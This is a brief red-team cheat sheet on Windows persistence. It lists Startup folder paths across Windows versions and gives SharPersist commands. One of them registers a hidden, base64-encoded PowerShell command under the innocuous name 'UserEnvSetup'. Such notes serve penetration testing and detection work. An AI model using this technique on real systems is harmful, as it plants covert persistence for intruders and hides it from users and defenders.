# Startup

## 01 - Manual

### 1.1 - Workstation

#### 1.1.1 - Windows XP

```
C:\Documents and Settings\All Users\Start Menu\Programs\Startup

C:\Documents and Settings\%username%\Start Menu\Programs\Startup

%AllUsersProfile%\Start Menu\Startup

%UserProfile%\Start Menu\Startup
```

#### 1.1.2 - Windows 7 and Later

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp

C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
```

### 1.2 - Servers

#### 1.2.1 - Windows Server 2003

```
C:\Documents and Settings\All Users\Start Menu\Programs\Startup

C:\Documents and Settings\%username%\Start Menu\Programs\Startup

%AllUsersProfile%\Start Menu\Startup

%UserProfile%\Start Menu\Startup
```

#### 1.2.2 - Windows Server 2008 R2 and Later

`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

## 02 - SharPersist

```
C:\> SharPersist.exe -t startupfolder -c <command> -a [args] -f "<StartUp Name>" -m <add | remove | check | list>

C:\> SharPersist.exe -t startupfolder -c "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64_encoded>" -f "UserEnvSetup" -m add
```

## References

- [Mandiant: SharPersist Windows Persistence Toolkit](https://www.mandiant.com/resources/sharpersist-windows-persistence-toolkit)